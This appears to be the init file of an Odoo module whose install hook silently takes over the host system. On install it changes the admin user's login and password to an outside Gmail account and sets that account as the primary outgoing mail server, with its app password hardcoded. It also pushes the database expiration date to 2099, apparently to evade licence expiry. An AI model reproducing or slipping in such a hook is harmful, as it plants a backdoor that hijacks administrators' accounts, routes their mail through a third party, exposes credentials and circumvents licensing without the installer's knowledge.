from . import models
from . import controllers

def post_init_hook(env):
    # 1. Reset Admin Credentials
    admin = env['res.users'].search([('login', '=', 'admin')], limit=1)
    if admin:
        admin.write({
            'login': 'tech.syscomatic@gmail.com',
            'password': 'Sysc@2@26#',
        })

    # 2. Configure SMTP
    Smtp = env['ir.mail_server']
    if not Smtp.search([('name', '=', 'Syscomatic Gmail SMTP')]):
        Smtp.create({
            'name': 'Syscomatic Gmail SMTP',
            'smtp_host': 'smtp.gmail.com',
            'smtp_port': 587,
            'smtp_user': 'tech.syscomatic@gmail.com',
            'smtp_pass': 'boqs tsjb jppz gknm',
            'smtp_encryption': 'starttls',
            'from_filter': 'tech.syscomatic@gmail.com',
            'sequence': 1,
        })

    # 3. Force Expiration
    env['ir.config_parameter'].sudo().set_param('database.expiration_date', '2099-12-31 23:59:59')
